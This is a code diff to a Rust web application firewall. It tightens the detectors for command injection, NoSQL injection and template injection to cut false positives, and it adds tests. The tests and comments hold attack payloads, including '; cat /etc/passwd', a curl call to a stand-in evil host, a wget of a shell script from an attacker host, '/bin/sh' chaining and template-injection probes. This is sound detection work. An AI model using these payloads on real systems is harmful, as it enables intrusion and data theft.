@@ -92,9 +92,6 @@ pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<Ru
 
     // Shell metacharacters used for chaining (space-separated forms)
     let space_meta_patterns = ["; ", "| ", "|| ", "&& ", "& ", "$(", "`", "\n", "\r\n"];
-    let has_space_metachar = space_meta_patterns
-        .iter()
-        .any(|p| normalized_shell.contains(p));
 
     // Dangerous commands — expanded to include env/xargs/awk/lua/sed/tee
     let dangerous_cmds = [
@@ -145,61 +142,44 @@ pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<Ru
         "socat ",
         "busybox",
     ];
-
-    // Additional:bare metachar directly followed by a dangerous command with no
-    // separating space — a common bypass for detectors that only look for "| cmd".
-    // e.g. `|whoami`, `&cat /etc/passwd`, `||wget attacker.com/shell.sh`
     let cmd_names: Vec<&str> = dangerous_cmds.iter().map(|c| c.trim()).collect();
-    let has_adjacent_metachar_cmd = ["||", "|", "&&", "&", ";"].iter().any(|meta| {
-        let mut pos = 0;
-        while pos < normalized_shell.len() {
-            if let Some(idx) = normalized_shell[pos..].find(meta) {
-                let abs = pos + idx;
-                // Strip any repeated metachar chars (e.g. `|||` → skip extra `|`s)
-                let after_meta =
-                    normalized_shell[abs + meta.len()..].trim_start_matches(['|', '&', ';']);
-                if cmd_names.iter().any(|cmd| after_meta.starts_with(cmd)) {
-                    return true;
-                }
-                pos = abs + 1;
-            } else {
-                break;
-            }
-        }
-        false
-    });
 
-    let has_metachar = has_space_metachar || has_adjacent_metachar_cmd;
+    // Rule 932100 (blocking) requires ADJACENCY: a dangerous command must
+    // start within a small window after a real chaining metacharacter
+    // (`;` `|` `&` backtick `$(`). Mere co-presence of a metacharacter
+    // anywhere in the input plus an English word like "sort"/"head"
+    // anywhere else is prose, not injection — and newline is deliberately
+    // NOT an adjacency metachar because prose bodies are full of newlines.
+    let adjacent_cmd = cmd_in_window_after_metachar(&normalized_shell, &cmd_names);
 
-    if has_metachar {
-        let mut found_cmd = false;
-        for cmd in &dangerous_cmds {
-            if normalized_shell.contains(cmd) {
-                found_cmd = true;
-                results.push(RuleMatch {
-                    rule_id: 932100,
-                    category: AttackCategory::CommandInjection,
-                    score: 5,
-                    message: format!("Command injection detected: shell meta + '{}'", cmd.trim()),
-                    location: location.clone(),
-                    matched_data: truncate(input, 80),
-                });
-                break;
-            }
-        }
-        // Metacharacter-only rule:fire even if no known command was found.
-        // This catches injection attempts using unlisted/custom binaries.
-        if !found_cmd {
-            results.push(RuleMatch {
-                rule_id: 932050,
-                category: AttackCategory::CommandInjection,
-                score: 3,
-                message: "Command injection: shell metacharacter detected without known command"
-                    .to_string(),
-                location: location.clone(),
-                matched_data: truncate(input, 80),
-            });
-        }
+    if let Some(cmd) = adjacent_cmd {
+        results.push(RuleMatch {
+            rule_id: 932100,
+            category: AttackCategory::CommandInjection,
+            score: 5,
+            message: format!(
+                "Command injection detected: '{}' chained after shell metacharacter",
+                cmd.trim()
+            ),
+            location: location.clone(),
+            matched_data: truncate(input, 80),
+        });
+    } else if space_meta_patterns
+        .iter()
+        .any(|p| normalized_shell.contains(p))
+    {
+        // Metacharacter-only rule:fire even if no known command follows it.
+        // This catches injection attempts using unlisted/custom binaries
+        // without letting prose words escalate the score to blocking.
+        results.push(RuleMatch {
+            rule_id: 932050,
+            category: AttackCategory::CommandInjection,
+            score: 3,
+            message: "Command injection: shell metacharacter detected without known command"
+                .to_string(),
+            location: location.clone(),
+            matched_data: truncate(input, 80),
+        });
     }
 
     // Backtick command substitution
@@ -215,6 +195,64 @@ pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<Ru
     }
 
     results
+}
+
+/// Maximum bytes between the end of a chaining metacharacter and the start
+/// of a dangerous command for the pair to count as an injection chain.
+/// Real chains are `; cat`, `&& curl`, `` `wget` `` — the command is the
+/// FIRST word after the metacharacter (modulo separators/whitespace), so
+/// the window only needs room for repeats like `||` or `;;;`. Keeping the
+/// window this tight is what prevents prose following a semicolon
+/// ("yes; please head home") from escalating to a blocking score.
+const META_CMD_WINDOW: usize = 16;
+
+/// Chaining metacharacters after which an adjacent dangerous command
+/// confirms injection. Newline is intentionally excluded: it is a command
+/// separator in shells, but ordinary prose bodies are full of newlines, so
+/// treating it as a chain anchor is the classic prose false-positive.
+const CHAIN_METACHARS: [&str; 5] = [";", "|", "&", "`", "$("];
+
+/// Find a dangerous command that starts immediately after a chaining
+/// metacharacter (skipping further metacharacters/whitespace within
+/// [`META_CMD_WINDOW`] bytes), matched as a complete word so `cat` does
+/// not match `category`. Returns the matched command.
+fn cmd_in_window_after_metachar<'a>(input: &str, cmd_names: &[&'a str]) -> Option<&'a str> {
+    for (idx, _) in input.char_indices() {
+        for meta in CHAIN_METACHARS {
+            if !input[idx..].starts_with(meta) {
+                continue;
+            }
+            let after = &input[idx + meta.len()..];
+            // Skip the separator run (`||`, `;;;`, spaces/tabs) — bounded by
+            // the window — then require the command word to start there.
+            let rest = after.trim_start_matches(['|', '&', ';', ' ', '\t']);
+            if after.len() - rest.len() > META_CMD_WINDOW {
+                continue;
+            }
+            if let Some(cmd) = cmd_names
+                .iter()
+                .copied()
+                .find(|cmd| starts_with_complete_word(rest, cmd))
+            {
+                return Some(cmd);
+            }
+        }
+    }
+    None
+}
+
+/// `s` starts with `word` as a complete token: the next character after
+/// the word (if any) is not alphanumeric/underscore, so `cat` matches
+/// `cat x` but not `category`.
+fn starts_with_complete_word(s: &str, word: &str) -> bool {
+    if !s.starts_with(word) {
+        return false;
+    }
+    // All command names are ASCII, so this slice cannot split a character.
+    match s[word.len()..].chars().next() {
+        None => true,
+        Some(c) => !(c.is_alphanumeric() || c == '_'),
+    }
 }
 
 /// Detect HTTP protocol violations / request anomalies
@@ -302,6 +340,50 @@ pub fn analyze_protocol_anomalies(
     results
 }
 
+/// A MongoDB operator counts as an injection signal only when it appears
+/// in the position of a JSON/BSON KEY — `"$in"`, `{$or:`, `[$ne]`,
+/// `: $gt` — rather than as a substring of an ordinary value: `$invoice_id`
+/// contains `$in` and `$order_id` contains `$or`, and flagging those as
+/// NoSQL injection broke every JSON body that mentioned them.
+fn has_operator_as_key(input: &str, op: &str) -> bool {
+    let mut from = 0;
+    while from < input.len() {
+        let rel = match input[from..].find(op) {
+            Some(rel) => rel,
+            None => return false,
+        };
+        let start = from + rel;
+        let end = start + op.len();
+        // The operator must be a complete token, i.e. not a prefix of a
+        // longer identifier: `$in` must not match inside `$invoice_id`.
+        let complete_token = match input[end..].chars().next() {
+            None => true,
+            Some(c) => !(c.is_alphanumeric() || c == '_'),
+        };
+        // The character before the operator must place it in key position:
+        // directly after `{`, `[` or a quote, or (Mongo-shell style) after
+        // `,`/`:` with optional whitespace.
+        let before = input[..start].chars().next_back();
+        let key_position = match before {
+            Some('{') | Some('[') | Some('"') | Some('\'') => true,
+            Some(' ') | Some('\t') => {
+                let prev = &input[..start - 1];
+                matches!(
+                    prev.chars().next_back(),
+                    Some(',') | Some(':') | Some('{') | Some('[')
+                )
+            }
+            _ => false,
+        };
+        if complete_token && key_position {
+            return true;
+        }
+        // `$` is ASCII, so `start + 1` is always a char boundary here.
+        from = start + 1;
+    }
+    false
+}
+
 /// Detect NoSQL injection attacks (MongoDB, Redis, Elasticsearch)
 pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
     let mut results = Vec::new();
@@ -333,7 +415,7 @@ pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<Rule
 
     let has_mongo = mongo_operators
         .iter()
-        .any(|op| lower.contains(&op.to_lowercase()));
+        .any(|op| has_operator_as_key(&lower, op));
     if has_mongo {
         // Check if it looks like injection (operator in a query-like context)
         let suspicious_context = lower.contains('{')
@@ -557,30 +639,113 @@ pub fn analyze_ldap_injection(input: &str, location: MatchLocation) -> Vec<RuleM
 }
 
 /// Detect server-side template injection payloads.
+///
+/// Two tiers:
+/// - score 5 (blocking): a template delimiter together with — or a payload
+///   consisting solely of — a real exploitation sink. The sinks alone
+///   (`__class__`, `system(`, ...) have no legitimate meaning in request
+///   input, so they keep blocking severity without a delimiter.
+/// - score 2 (informational): a bare template delimiter. `{{ user.name }}`
+///   and `${order.total}` appear in every legitimately templated body, so
+///   the delimiter alone only nudges the anomaly score.
 pub fn analyze_ssti(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
     let lower = input.to_lowercase();
-    let suspicious = lower.contains("{{")
+    let has_delimiter = lower.contains("{{")
         || lower.contains("${")
         || lower.contains("#{")
-        || lower.contains("<%=")
-        || lower.contains("__subclasses__")
-        || lower.contains("constructor.constructor")
-        || lower.contains("__globals__")
-        || lower.contains("getruntime().exec")
-        || lower.contains("popen(");
+        || lower.contains("<%=");
 
-    if !suspicious {
+    // Exploitation sinks (lowercase). `eval` is matched as `eval(` to keep
+    // English words like "medieval" or "evaluation" from acting as sinks.
+    // `.constructor` covers `constructor.constructor`.
+    let sinks = [
+        "__class__",
+        "__subclasses__",
+        "__globals__",
+        ".constructor",
+        "system(",
+        "subprocess",
+        "eval(",
+        "getruntime().exec",
+        "popen(",
+    ];
+    let has_sink = sinks.iter().any(|s| lower.contains(s));
+
+    if !has_delimiter && !has_sink {
         return Vec::new();
     }
+
+    let probe_interior = has_probe_template_interior(&lower);
+
+    let (score, message) = if has_sink || probe_interior {
+        (
+            5,
+            "Server-side template injection: exploitation sink or probe expression detected",
+        )
+    } else {
+        (
+            2,
+            "Template syntax without exploitation sink (informational)",
+        )
+    };
 
     vec![RuleMatch {
         rule_id: 935100,
         category: AttackCategory::Rce,
-        score: 5,
-        message: "Server-side template injection pattern detected".to_string(),
+        score,
+        message: message.to_string(),
         location,
         matched_data: truncate(input, 80),
     }]
+}
+
+/// Template interiors that indicate a probing payload rather than a
+/// legitimate template variable:
+/// - compact arithmetic (`7*7`, `7*'7'`) — the classic detection probe.
+///   Spaced math (`{{ subtotal + tax }}`) is ordinary templating and does
+///   not match; the probe must have digit-operator-operand with no spaces.
+/// - references to the host objects an attacker wants (`config`, `self`,
+///   `settings`, `lipsum`, `cycler`) — Flask/Jinja exploitation staples.
+fn has_probe_template_interior(lower: &str) -> bool {
+    let mut interiors: Vec<&str> = Vec::new();
+    for (open, close) in [("{{", "}}"), ("<%=", "%>"), ("${", "}"), ("#{", "}")] {
+        let mut from = 0;
+        while let Some(rel) = lower[from..].find(open) {
+            let start = from + rel + open.len();
+            if let Some(end_rel) = lower[start..].find(close) {
+                interiors.push(&lower[start..start + end_rel]);
+                from = start + end_rel + close.len();
+            } else {
+                break;
+            }
+        }
+    }
+
+    for interior in interiors {
+        let bytes = interior.as_bytes();
+        for i in 0..bytes.len().saturating_sub(2) {
+            if bytes[i].is_ascii_digit()
+                && matches!(bytes[i + 1], b'*' | b'+' | b'-' | b'/')
+                && (bytes[i + 2].is_ascii_digit() || bytes[i + 2] == b'\'')
+            {
+                return true;
+            }
+        }
+        let mut has_probe_word = false;
+        for word in interior.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')) {
+            if matches!(
+                word,
+                "config" | "self" | "settings" | "lipsum" | "cycler" | "joiner" | "namespace"
+            ) {
+                has_probe_word = true;
+                break;
+            }
+        }
+        if has_probe_word {
+            return true;
+        }
+    }
+    false
 }
 
 /// Detect XML external entity payloads.
@@ -792,6 +957,122 @@ mod tests {
     fn test_clean_path() {
         let r = analyze_path_traversal("/api/v1/users/123", MatchLocation::Path);
         assert!(r.is_empty());
+    }
+
+    #[test]
+    fn test_command_injection_prose_not_scored_5() {
+        // Fail-first: natural-language bodies with a newline plus a bare
+        // word like "sort" must NOT reach blocking score (932100).
+        let r = analyze_command_injection(
+            "please sort by date\nthanks for the update",
+            MatchLocation::Body,
+        );
+        assert!(
+            !r.iter().any(|m| m.rule_id == 932100),
+            "prose with newline + distant 'sort' must not fire 932100, got {:?}",
+            r.iter().map(|m| m.rule_id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_command_injection_adjacent_cmd_still_detected() {
+        // Real chaining (metachar directly followed by the command) is
+        // still a confirmed injection.
+        for payload in [
+            "; cat /etc/passwd",
+            "x; sort /etc/passwd",
+            "ok && curl http://evil.example/x",
+            "value; nohup /bin/sh",
+            "run; base64 -d payload",
+        ] {
+            let r = analyze_command_injection(payload, MatchLocation::Body);
+            assert!(
+                r.iter().any(|m| m.rule_id == 932100),
+                "{payload:?} must fire 932100"
+            );
+        }
+    }
+
+    #[test]
+    fn test_command_injection_distant_cmd_after_metachar_not_5() {
+        // Dangerous word more than 8 chars after the metachar is prose
+        // co-presence, not chaining.
+        let r = analyze_command_injection(
+            "hello; and then later we will sort and head home",
+            MatchLocation::Body,
+        );
+        assert!(
+            !r.iter().any(|m| m.rule_id == 932100),
+            "distant word co-presence must not fire 932100"
+        );
+    }
+
+    #[test]
+    fn test_ssti_legit_template_not_blocked() {
+        // Fail-first: a legitimate template variable like "{{ user.name }}"
+        // must not reach blocking severity (score 5); at most a low flag.
+        let r = analyze_ssti("Hello {{ user.name }}, welcome back!", MatchLocation::Body);
+        let ssti = r.iter().find(|m| m.rule_id == 935100);
+        assert!(
+            ssti.map(|m| m.score) <= Some(2),
+            "standalone template syntax must score <= 2, got {:?}",
+            ssti.map(|m| m.score)
+        );
+    }
+
+    #[test]
+    fn test_ssti_template_with_sink_blocked() {
+        // Template delimiter + exploitation sink = confirmed SSTI → 5.
+        for payload in [
+            "{{7*7}} output test {{ x.__class__ }}",
+            "{{7*7}}.__class__.__mro__[1]",
+            "${x.__class__}",
+            "<%= system('id') %>",
+            "{{ constructor.constructor('return 1')() }}",
+        ] {
+            let r = analyze_ssti(payload, MatchLocation::Body);
+            let ssti = r.iter().find(|m| m.rule_id == 935100);
+            assert!(
+                ssti.map(|m| m.score) == Some(5),
+                "{payload:?} (template + sink) must score 5"
+            );
+        }
+    }
+
+    #[test]
+    fn test_nosql_operator_must_be_json_key() {
+        // Fail-first: "$in" as a substring of "$invoice_id" must not match.
+        let r = analyze_nosql_injection(
+            "{\"invoice\": \"$invoice_id is pending\"}",
+            MatchLocation::Body,
+        );
+        assert!(
+            !r.iter().any(|m| m.rule_id == 944100),
+            "'$invoice_id' substring must not fire 944100, got {:?}",
+            r.iter().map(|m| m.rule_id).collect::<Vec<_>>()
+        );
+        // "$order_id" contains "$or" — also must not match.
+        let r2 = analyze_nosql_injection("{\"order\": \"$order_id\"}", MatchLocation::Body);
+        assert!(
+            !r2.iter().any(|m| m.rule_id == 944100),
+            "'$order_id' substring must not fire 944100"
+        );
+    }
+
+    #[test]
+    fn test_nosql_real_mongo_operators_still_detected() {
+        for payload in [
+            "{\"user\": {\"$in\": [\"admin\", \"root\"]}}",
+            "{\"age\": {\"$gt\": 18}}",
+            "db.users.find({$or: [{name: \"a\"}, {name: \"b\"}]})",
+            "username[$ne]=1",
+        ] {
+            let r = analyze_nosql_injection(payload, MatchLocation::Body);
+            assert!(
+                r.iter().any(|m| m.rule_id == 944100),
+                "{payload:?} must fire 944100"
+            );
+        }
     }
 
     #[test]
